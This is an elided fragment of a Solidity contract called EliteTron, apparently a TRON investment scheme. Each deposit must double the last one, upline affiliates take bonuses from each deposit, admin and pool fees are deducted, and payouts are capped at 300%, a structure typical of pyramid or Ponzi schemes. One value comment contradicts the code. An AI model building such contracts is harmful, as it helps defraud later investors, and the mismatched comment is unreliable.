...
contract EliteTron {
    ...
    constructor(address payable _owner, address payable _admin_fee) public {
        ...
        cycles.push(1e11);//100000trx
        cycles.push(3e11);//300000trx
        cycles.push(9e11);//900000trx
        cycles.push(2e11);//25000000 trx //Max 2.5 million
    }
    ...
    function _deposit(address _addr, uint256 _amount) private {
        ...
        if(users[_addr].deposit_time > 0) {
            ...
            require(_amount >= users[_addr].deposit_amount * 2,"Double then the previous Investment");
        }
        ...
        if(users[_addr].upline != address(0)) {
            ...
            for(uint8 i = 0; i < aff_bonuses.length; i++) 
            {
                if(up == address(0)) break;
                
               
                    uint256 bonus = _amount * aff_bonuses[i] / 100;
        ...
        admin_fee.transfer(_amount / 20); //5% Admin fees
        
    }

    function _pollDeposits(address _addr, uint256 _amount) private {
        pool_balance += _amount * 5 / 100; //5% to the pool
    ...
    function maxPayoutOf(uint256 _amount) pure external returns(uint256) {
        return _amount * 30 / 10; //capping at 300%
    }
